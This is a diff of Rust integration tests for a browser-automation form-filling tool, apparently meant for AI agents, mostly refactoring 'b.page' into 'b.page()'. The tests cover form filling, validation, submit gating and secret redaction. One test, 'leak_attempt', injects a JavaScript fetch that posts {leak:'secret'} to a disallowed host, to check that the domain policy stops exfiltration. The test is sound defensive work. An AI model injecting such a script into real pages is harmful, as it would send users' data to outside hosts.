@@ -47,9 +47,9 @@ async fn basic_fill_and_native_post() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/basic.html")).await.unwrap();
+    b.page().navigate(&srv.url("/basic.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(req(json!({"Full name": "Ada Lovelace", "email": "ada@example.com", "message": "Hello there", "newsletter": true})), None)
         .await
         .unwrap();
@@ -59,7 +59,7 @@ async fn basic_fill_and_native_post() {
         "{rep:#?}"
     );
     assert!(rep.ok(), "{rep:#?}");
-    let out = b.page.submit(None, None).await.unwrap();
+    let out = b.page().submit(None, None).await.unwrap();
     assert_eq!(out.status, SubmitStatus::Submitted, "{out:#?}");
     assert!(out.action.navigated);
     assert!(
@@ -80,9 +80,12 @@ async fn validation_errors_are_reported_and_recoverable() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/validation.html")).await.unwrap();
+    b.page()
+        .navigate(&srv.url("/validation.html"))
+        .await
+        .unwrap();
     // Submitting empty must surface errors, not claim success.
-    let out = b.page.submit(None, None).await.unwrap();
+    let out = b.page().submit(None, None).await.unwrap();
     assert_eq!(out.status, SubmitStatus::ValidationFailed, "{out:#?}");
     assert!(
         out.field_errors
@@ -94,14 +97,14 @@ async fn validation_errors_are_reported_and_recoverable() {
     assert!(srv.submissions().is_empty());
     // Bad values: fill succeeds but the page's complaints show up in the report.
     let rep = b
-        .page
+        .page()
         .fill_form(req(json!({"email": "nope", "age": 12, "zip": "123"})), None)
         .await
         .unwrap();
     assert_eq!(rep.field_errors.len(), 3, "{rep:#?}");
     // Correct them and succeed.
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"email": "ada@example.com", "age": 36, "zip": "94107"})),
             None,
@@ -109,7 +112,7 @@ async fn validation_errors_are_reported_and_recoverable() {
         .await
         .unwrap();
     assert!(rep.field_errors.is_empty(), "{rep:#?}");
-    let out = b.page.submit(None, None).await.unwrap();
+    let out = b.page().submit(None, None).await.unwrap();
     assert_eq!(out.status, SubmitStatus::Submitted, "{out:#?}");
     assert_eq!(srv.last().unwrap()["zip"], "94107");
     b.close().await;
@@ -120,16 +123,19 @@ async fn dependent_dropdowns_in_one_call() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/dependent.html")).await.unwrap();
+    b.page()
+        .navigate(&srv.url("/dependent.html"))
+        .await
+        .unwrap();
     // Keys deliberately given "out of order": state before country.
     let rep = b
-        .page
+        .page()
         .fill_form(req(json!({"state": "Bavaria", "Recipient": "Ada", "country": "Germany", "city": "Munich"})), None)
         .await
         .unwrap();
     assert!(rep.ok(), "{rep:#?}");
     assert_eq!(rep.fields.len(), 4);
-    let out = b.page.submit(None, None).await.unwrap();
+    let out = b.page().submit(None, None).await.unwrap();
     assert_eq!(out.status, SubmitStatus::Submitted, "{out:#?}");
     let got = srv.last().unwrap();
     assert_eq!(
@@ -144,13 +150,13 @@ async fn multi_step_wizard() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/wizard.html")).await.unwrap();
+    b.page().navigate(&srv.url("/wizard.html")).await.unwrap();
     // Premature submit on step 1 must fail validation, not advance.
-    let out = b.page.submit(None, None).await.unwrap();
+    let out = b.page().submit(None, None).await.unwrap();
     assert_eq!(out.status, SubmitStatus::ValidationFailed, "{out:#?}");
 
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"first name": "Ada", "last name": "Lovelace"})),
             None,
@@ -159,12 +165,12 @@ async fn multi_step_wizard() {
         .unwrap();
     assert_eq!(rep.step.as_ref().map(|s| (s.index, s.total)), Some((1, 3)));
     assert_eq!(
-        b.page.submit(None, None).await.unwrap().status,
+        b.page().submit(None, None).await.unwrap().status,
         SubmitStatus::Advanced
     );
 
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"email": "ada@example.com", "phone": "5551234567"})),
             None,
@@ -173,17 +179,17 @@ async fn multi_step_wizard() {
         .unwrap();
     assert_eq!(rep.step.as_ref().map(|s| s.index), Some(2), "{rep:#?}");
     assert_eq!(
-        b.page.submit(None, None).await.unwrap().status,
+        b.page().submit(None, None).await.unwrap().status,
         SubmitStatus::Advanced
     );
 
     let rep = b
-        .page
+        .page()
         .fill_form(req(json!({"confirm the details": true})), None)
         .await
         .unwrap();
     assert!(rep.ok(), "{rep:#?}");
-    let out = b.page.submit(None, None).await.unwrap();
+    let out = b.page().submit(None, None).await.unwrap();
     assert_eq!(out.status, SubmitStatus::Submitted, "{out:#?}");
     let got = srv.last().unwrap();
     assert_eq!(got["first_name"], "Ada");
@@ -196,10 +202,13 @@ async fn controlled_inputs_are_not_silently_dropped() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/controlled.html")).await.unwrap();
-    let rep = b.page.fill_form(req(json!({"First name": "Ada", "Last name": "Lovelace", "Company": "Analytical Engines"})), None).await.unwrap();
+    b.page()
+        .navigate(&srv.url("/controlled.html"))
+        .await
+        .unwrap();
+    let rep = b.page().fill_form(req(json!({"First name": "Ada", "Last name": "Lovelace", "Company": "Analytical Engines"})), None).await.unwrap();
     assert!(rep.ok(), "{rep:#?}");
-    b.page.submit(None, None).await.unwrap();
+    b.page().submit(None, None).await.unwrap();
     let got = srv.last().unwrap();
     assert_eq!(got["first"], "Ada");
     assert_eq!(got["company"], "Analytical Engines");
@@ -211,20 +220,20 @@ async fn custom_combobox_picks_the_option() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/combobox.html")).await.unwrap();
+    b.page().navigate(&srv.url("/combobox.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(req(json!({"Country": "Germany"})), None)
         .await
         .unwrap();
     assert!(rep.ok(), "{rep:#?}");
-    b.page.submit(None, None).await.unwrap();
+    b.page().submit(None, None).await.unwrap();
     assert_eq!(srv.last().unwrap()["country"], "Germany");
     // Ambiguous text must not guess.
     srv.reset();
-    b.page.navigate(&srv.url("/combobox.html")).await.unwrap();
+    b.page().navigate(&srv.url("/combobox.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(req(json!({"Country": "United"})), None)
         .await
         .unwrap();
@@ -237,11 +246,11 @@ async fn shadow_dom_form() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/shadow.html")).await.unwrap();
-    let snap = b.page.snapshot(SnapshotOpts::default()).await.unwrap();
+    b.page().navigate(&srv.url("/shadow.html")).await.unwrap();
+    let snap = b.page().snapshot(SnapshotOpts::default()).await.unwrap();
     assert!(snap.text.contains("textbox \"Your name\""), "{}", snap.text);
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"Your name": "Ada", "Email address": "ada@example.com"})),
             None,
@@ -250,7 +259,7 @@ async fn shadow_dom_form() {
         .unwrap();
     assert!(rep.ok(), "{rep:#?}");
     assert_eq!(
-        b.page.submit(None, None).await.unwrap().status,
+        b.page().submit(None, None).await.unwrap().status,
         SubmitStatus::Submitted
     );
     assert_eq!(srv.last().unwrap()["email"], "ada@example.com");
@@ -262,9 +271,9 @@ async fn same_origin_iframe_form() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/iframe.html")).await.unwrap();
+    b.page().navigate(&srv.url("/iframe.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"Subject": "Broken login", "Details": "Cannot sign in"})),
             None,
@@ -272,7 +281,7 @@ async fn same_origin_iframe_form() {
         .await
         .unwrap();
     assert!(rep.ok(), "{rep:#?}");
-    let out = b.page.submit(None, None).await.unwrap();
+    let out = b.page().submit(None, None).await.unwrap();
     assert!(srv.wait_for(1, Duration::from_secs(3)), "{out:#?}");
     assert_eq!(srv.last().unwrap()["subject"], "Broken login");
     b.close().await;
@@ -283,11 +292,11 @@ async fn rich_input_types() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/types.html")).await.unwrap();
+    b.page().navigate(&srv.url("/types.html")).await.unwrap();
     let cv = tempfile::NamedTempFile::new().unwrap();
     std::fs::write(cv.path(), "cv").unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({
                 "Date of birth": "March 5, 2001", "Preferred time": "3:30 PM", "Guests": 4, "Satisfaction": 7,
@@ -301,7 +310,7 @@ async fn rich_input_types() {
     assert!(rep.unmatched.is_empty(), "{rep:#?}");
     assert_eq!(rep.failed(), 0, "{rep:#?}");
     assert_eq!(
-        b.page.submit(None, None).await.unwrap().status,
+        b.page().submit(None, None).await.unwrap().status,
         SubmitStatus::Submitted
     );
     let got = srv.last().unwrap();
@@ -324,9 +333,9 @@ async fn masks_and_length_limits_are_handled_honestly() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/masked.html")).await.unwrap();
+    b.page().navigate(&srv.url("/masked.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"Mobile number": "5551234567", "Short code": "12345"})),
             None,
@@ -358,9 +367,9 @@ async fn unmatched_and_ambiguous_keys_are_reported_not_guessed() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/basic.html")).await.unwrap();
+    b.page().navigate(&srv.url("/basic.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"favourite colour": "blue", "email": "a@b.co"})),
             None,
@@ -382,15 +391,15 @@ async fn delta_snapshots_shrink_output() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/types.html")).await.unwrap();
-    let full = b.page.snapshot(SnapshotOpts::default()).await.unwrap();
+    b.page().navigate(&srv.url("/types.html")).await.unwrap();
+    let full = b.page().snapshot(SnapshotOpts::default()).await.unwrap();
     assert!(full.text.contains("textbox \"Notes\""), "{}", full.text);
-    b.page
+    b.page()
         .fill_form(req(json!({"Notes": "Window seat please"})), None)
         .await
         .unwrap();
     let delta = b
-        .page
+        .page()
         .snapshot(SnapshotOpts {
             mode: SnapshotMode::Delta,
             ..Default::default()
@@ -420,7 +429,11 @@ async fn policy_blocks_disallowed_domains() {
     let b = Browser::launch(LaunchOptions::default(), policy)
         .await
         .unwrap();
-    let err = b.page.navigate(&srv.url("/basic.html")).await.unwrap_err();
+    let err = b
+        .page()
+        .navigate(&srv.url("/basic.html"))
+        .await
+        .unwrap_err();
     assert!(
         err.to_string().contains("not in the allowed domains"),
         "{err}"
@@ -433,9 +446,9 @@ async fn auto_mode_without_suggester_is_a_noop() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/basic.html")).await.unwrap();
+    b.page().navigate(&srv.url("/basic.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             FillRequest {
                 auto: AutoMode::All,
@@ -455,8 +468,8 @@ async fn snapshot_keeps_controls_wrapped_in_labels() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/basic.html")).await.unwrap();
-    let snap = b.page.snapshot(SnapshotOpts::default()).await.unwrap();
+    b.page().navigate(&srv.url("/basic.html")).await.unwrap();
+    let snap = b.page().snapshot(SnapshotOpts::default()).await.unwrap();
     assert!(
         snap.text.contains("checkbox \"Subscribe to newsletter\""),
         "{}",
@@ -476,9 +489,9 @@ async fn long_form_fills_in_one_call() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/longform.html")).await.unwrap();
+    b.page().navigate(&srv.url("/longform.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({
                 "First name": "Ada", "Last name": "Lovelace", "Email": "ada@example.com", "Phone": "5551234567",
@@ -495,7 +508,7 @@ async fn long_form_fills_in_one_call() {
     assert_eq!(rep.failed(), 0, "{rep:#?}");
     assert_eq!(rep.fields.len(), 17);
     assert_eq!(
-        b.page.submit(None, None).await.unwrap().status,
+        b.page().submit(None, None).await.unwrap().status,
         SubmitStatus::Submitted
     );
     let got = srv.last().unwrap();
@@ -522,17 +535,17 @@ async fn actions_settle_quickly() {
     let mut nav = Duration::MAX;
     for _ in 0..3 {
         let t = std::time::Instant::now();
-        b.page.navigate(&srv.url("/basic.html")).await.unwrap();
+        b.page().navigate(&srv.url("/basic.html")).await.unwrap();
         nav = nav.min(t.elapsed());
     }
     let t = std::time::Instant::now();
-    b.page
+    b.page()
         .fill_form(req(json!({"name": "A", "email": "a@b.co"})), None)
         .await
         .unwrap();
     let fill = t.elapsed();
     let t = std::time::Instant::now();
-    b.page.submit(None, None).await.unwrap();
+    b.page().submit(None, None).await.unwrap();
     let submit = t.elapsed();
     assert!(nav < Duration::from_millis(1500), "navigate took {nav:?}");
     assert!(
@@ -551,9 +564,9 @@ async fn custom_aria_widgets_and_contenteditable() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/aria.html")).await.unwrap();
+    b.page().navigate(&srv.url("/aria.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"Contact method": "Phone", "Weekly digest": true, "I agree to the terms": true, "Short bio": "Rust and browsers"})),
             None,
@@ -562,7 +575,7 @@ async fn custom_aria_widgets_and_contenteditable() {
         .unwrap();
     assert!(rep.unmatched.is_empty(), "{rep:#?}");
     assert_eq!(rep.failed(), 0, "{rep:#?}");
-    b.page.submit(None, None).await.unwrap();
+    b.page().submit(None, None).await.unwrap();
     let got = srv.last().unwrap();
     assert_eq!(got["contact"], "phone", "{got}");
     assert_eq!(got["digest"], true, "{got}");
@@ -576,13 +589,13 @@ async fn conditional_fields_appear_and_are_filled_in_order() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page
+    b.page()
         .navigate(&srv.url("/conditional.html"))
         .await
         .unwrap();
     // Fields for "Bug report" do not exist until the type is chosen; the caller passes them anyway.
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"Request type": "Bug report", "Steps to reproduce": "Click save", "Severity": "High",
                        "I want to add contact details": true, "Email": "a@b.co"})),
@@ -593,7 +606,7 @@ async fn conditional_fields_appear_and_are_filled_in_order() {
     assert!(rep.unmatched.is_empty(), "{rep:#?}");
     assert_eq!(rep.failed(), 0, "{rep:#?}");
     assert_eq!(
-        b.page.submit(None, None).await.unwrap().status,
+        b.page().submit(None, None).await.unwrap().status,
         SubmitStatus::Submitted
     );
     let got = srv.last().unwrap();
@@ -609,18 +622,18 @@ async fn hidden_branch_is_not_filled_and_validation_reports_page_message() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page
+    b.page()
         .navigate(&srv.url("/conditional.html"))
         .await
         .unwrap();
-    b.page
+    b.page()
         .fill_form(
             req(json!({"Request type": "Billing", "Invoice number": "12"})),
             None,
         )
         .await
         .unwrap();
-    let out = b.page.submit(None, None).await.unwrap();
+    let out = b.page().submit(None, None).await.unwrap();
     assert_eq!(out.status, SubmitStatus::ValidationFailed, "{out:#?}");
     assert!(
         format!("{out:?}").contains("INV-1234"),
@@ -635,9 +648,12 @@ async fn calendar_date_picker_readonly_input() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/datepicker.html")).await.unwrap();
+    b.page()
+        .navigate(&srv.url("/datepicker.html"))
+        .await
+        .unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"Check-in date": "2026-12-24", "Guests": 2})),
             None,
@@ -645,7 +661,7 @@ async fn calendar_date_picker_readonly_input() {
         .await
         .unwrap();
     assert_eq!(rep.failed(), 0, "{rep:#?}");
-    b.page.submit(None, None).await.unwrap();
+    b.page().submit(None, None).await.unwrap();
     let got = srv.last().unwrap();
     assert_eq!(got["checkin"], "2026-12-24", "{got}");
     assert_eq!(got["guests"], "2");
@@ -657,10 +673,13 @@ async fn ambiguous_key_stays_ambiguous_after_its_rival_is_filled() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/ambiguous.html")).await.unwrap();
+    b.page()
+        .navigate(&srv.url("/ambiguous.html"))
+        .await
+        .unwrap();
     // "phone" fits both fields equally. It must not win Shipping just because Billing got filled first.
     let rep = b
-        .page
+        .page()
         .fill_form(req(json!({"Billing phone": "111", "phone": "222"})), None)
         .await
         .unwrap();
@@ -668,7 +687,7 @@ async fn ambiguous_key_stays_ambiguous_after_its_rival_is_filled() {
     assert_eq!(rep.unmatched.len(), 1, "{rep:#?}");
     assert_eq!(rep.unmatched[0].key, "phone");
     assert!(!rep.ok(), "an unmatched key must make the report not ok");
-    b.page.submit(None, None).await.unwrap();
+    b.page().submit(None, None).await.unwrap();
     let got = srv.last().unwrap();
     assert_eq!(got["billing"], "111");
     assert_eq!(
@@ -683,9 +702,9 @@ async fn form_remounted_mid_fill_is_followed_not_abandoned() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/remount.html")).await.unwrap();
+    b.page().navigate(&srv.url("/remount.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"Name": "Ada", "Plan": "Team", "Seats": 5})),
             None,
@@ -694,7 +713,7 @@ async fn form_remounted_mid_fill_is_followed_not_abandoned() {
         .unwrap();
     assert!(rep.ok(), "{rep:#?}");
     assert_eq!(rep.fields.len(), 3, "{rep:#?}");
-    b.page.submit(None, None).await.unwrap();
+    b.page().submit(None, None).await.unwrap();
     let got = srv.last().unwrap();
     assert_eq!(got["name"], "Ada", "{got}");
     assert_eq!(got["plan"], "team");
@@ -707,16 +726,16 @@ async fn keys_are_reported_when_the_form_disappears() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/remount.html")).await.unwrap();
+    b.page().navigate(&srv.url("/remount.html")).await.unwrap();
     // Remove the form as soon as the plan is chosen; "Seats" can never be filled.
-    b.page
+    b.page()
         .eval(
             "document.getElementById('p').addEventListener('change',()=>setTimeout(()=>{document.getElementById('root').innerHTML='<p>Gone</p>'},0))",
         )
         .await
         .unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(req(json!({"Plan": "Team", "Seats": 5})), None)
         .await
         .unwrap();
@@ -733,9 +752,9 @@ async fn secrets_do_not_come_back_through_reports_or_snapshots() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.navigate(&srv.url("/payment.html")).await.unwrap();
+    b.page().navigate(&srv.url("/payment.html")).await.unwrap();
     let rep = b
-        .page
+        .page()
         .fill_form(
             req(json!({"Name on card": "Ada Lovelace", "Card number": "4111111111111111", "Account PIN": "9876"})),
             None,
@@ -750,7 +769,7 @@ async fn secrets_do_not_come_back_through_reports_or_snapshots() {
     );
     // Snapshot: the same page, read back later, must not echo them either.
     let snap = b
-        .page
+        .page()
         .snapshot(SnapshotOpts {
             mode: SnapshotMode::Full,
             scope: None,
@@ -778,9 +797,9 @@ async fn leak_attempt(policy: Policy) -> bool {
         .await
         .unwrap();
     // 127.0.0.1 is the allowed host; "localhost" is a different host that reaches the same server.
-    b.page.navigate(&srv.url("/basic.html")).await.unwrap();
+    b.page().navigate(&srv.url("/basic.html")).await.unwrap();
     let evil = srv.url("/submit").replace("127.0.0.1", "localhost");
-    b.page
+    b.page()
         .eval(&format!(
             "fetch({evil:?},{{method:'POST',mode:'no-cors',headers:{{'content-type':'text/plain'}},body:JSON.stringify({{leak:'secret'}})}}).catch(()=>{{}})"
         ))
@@ -815,20 +834,20 @@ async fn submit_gate_blocks_every_path_except_a_confirmed_submit() {
     let Some((srv, b)) = setup().await else {
         return;
     };
-    b.page.set_submit_gate(true).await.unwrap();
-    b.page.navigate(&srv.url("/basic.html")).await.unwrap();
-    b.page
+    b.set_submit_gate(true).await.unwrap();
+    b.page().navigate(&srv.url("/basic.html")).await.unwrap();
+    b.page()
         .fill_form(
             req(json!({"Full name": "Ada Lovelace", "email": "ada@example.com", "message": "Hello there"})),
             None,
         )
         .await
         .unwrap();
-    let ir = b.page.forms().await.unwrap();
+    let ir = b.page().forms().await.unwrap();
     let submit_ref = ir.forms[0].submit[0].r#ref.clone();
 
     // Clicking the submit button directly, and pressing Enter in a field, both try to POST.
-    let out = b.page.click(&submit_ref).await.unwrap();
+    let out = b.page().click(&submit_ref).await.unwrap();
     assert!(srv.last().is_none(), "click bypassed the gate");
     assert!(
         out.warnings
@@ -837,13 +856,13 @@ async fn submit_gate_blocks_every_path_except_a_confirmed_submit() {
         "the agent must be told why nothing happened: {out:?}"
     );
     let name_ref = ir.forms[0].fields[0].r#ref.clone();
-    b.page.click(&name_ref).await.unwrap();
-    let _ = b.page.press("Enter").await;
+    b.page().click(&name_ref).await.unwrap();
+    let _ = b.page().press("Enter").await;
     tokio::time::sleep(Duration::from_millis(400)).await;
     assert!(srv.last().is_none(), "Enter bypassed the gate");
 
     // The confirmed path still works, on the same page the blocked attempts left intact.
-    let res = b.page.submit(None, None).await.unwrap();
+    let res = b.page().submit(None, None).await.unwrap();
     assert_eq!(res.status, SubmitStatus::Submitted, "{res:#?}");
     assert_eq!(srv.last().unwrap()["name"], "Ada Lovelace");
     b.close().await;
